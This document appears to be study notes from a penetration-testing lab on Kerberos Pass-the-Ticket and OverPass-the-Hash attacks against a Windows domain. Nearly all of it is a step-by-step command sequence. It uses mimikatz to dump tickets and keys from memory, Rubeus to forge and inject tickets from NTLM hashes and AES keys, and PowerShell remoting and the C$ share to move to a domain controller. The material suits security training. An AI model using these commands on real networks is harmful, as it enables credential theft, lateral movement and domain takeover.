
Use stolen Kerberos ticket to move laterally instead of an NTLM password hash.

- TGT - Ticket Granting Ticket: first ticket, allows client to obtain additional tickets
- TGS - Ticket Granting Services: requested by users who want to use a service, which verify the user's identity

```cmd-session
mimikatz.exe
```
```cmd-session
privilege::debug
```
```cmd-session
sekurlsa::tickets /export
```
```cmd-session
exit
```
```cmd-session
dir *.kirbi
```

Format of ticket files: 
[randomvalue]-username@service-domain.local.kirbi

If service is krbtgt, then it is a TGT of that account

```cmd-session
Rubeus.exe dump /nowrap
```
(dumps ticket in base64)

#### Pass the Key or OverPass the Hash

Converts hash/key into a TGT

Extract Kerberos Keys
```cmd-session
mimikatz.exe
```
```cmd-session
privilege::debug
```
```cmd-session
sekurlsa::ekeys
```

Mimikatz - Pass the Key or OverPass the Hash
```cmd-session
mimikatz.exe
```
```cmd-session
privilege::debug
```
```cmd-session
sekurlsa::pth /domain:inlanefreight.htb /user:plaintext /ntlm:3f74aa8f08f712f09cd5177b5c1ce50f
```

Rubeus - Pass the Key or OverPass the Hash
```cmd-session
Rubeus.exe  asktgt /domain:inlanefreight.htb /user:plaintext /aes256:b21c99fc068e3ab2ca789bccbef67de43791fd911c6e15ead25641a8fda3fe60 /nowrap
```

Mimikatz needs admin rights while Rubeus doesn't.


Rubeus Pass the Ticket
```cmd-session
Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /rc4:3f74aa8f08f712f09cd5177b5c1ce50f /ptt
```

(Import .kirbi file)
```cmd-session
Rubeus.exe ptt /ticket:[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi
```

In PowerShell, convert .kirbi to Base64 format
```powershell-session
[Convert]::ToBase64String([IO.File]::ReadAllBytes("[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"))
```

Pass the Ticket - Base64 format
```cmd-session
Rubeus.exe ptt /ticket:doIE1jCCBNKgAwIBBaEDAgEWooID+TCCA/VhggPxMIID7aADAgEFoQkbB0hUQi5DT02iHDAaoAMCAQKhEzARGwZrcmJ0Z3QbB2h0Yi5jb22jggO7MIIDt6ADAgESoQMCAQKiggOpBIIDpY8Kcp4i71zFcWRgpx8ovymu3HmbOL4MJVCfkGIrdJEO0iPQbMRY2pzSrk/gHuER2XRLdV/
```

```cmd-session
mimikatz.exe
```
```cmd-session
privilege::debug
```
```cmd-session
kerberos::ptt "C:\Users\plaintext\Desktop\Mimikatz\[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"
```
```cmd-session
exit
```
```cmd-session
dir \\DC01.inlanefreight.htb\c$
```

misc::cmd
(this command opens cmd prompt in mimikatz)


#### PowerShell Remoting
Must be a member of Remote Management Users group, does not need admin privileges

```cmd-session
mimikatz.exe
```
```cmd-session
privilege::debug
```
```cmd-session
kerberos::ptt "C:\Users\Administrator.WIN01\Desktop\[0;1812a]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi"
```
```cmd-session
exit
```
```cmd-session
powershell
```
```cmd-session
Enter-PSSession -ComputerName DC01
```

Rubeus Sacrificial Process
```cmd-session
Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show
```
```cmd-session
Rubeus.exe asktgt /user:john /domain:inlanefreight.htb /aes256:9279bcbd40db957a0ed0d3856b2e67f9bb58e6dc7fc07207d0763ce2713f11dc /ptt
```
```cmd-session
powershell
```
```cmd-session
Enter-PSSession -ComputerName DC01
```


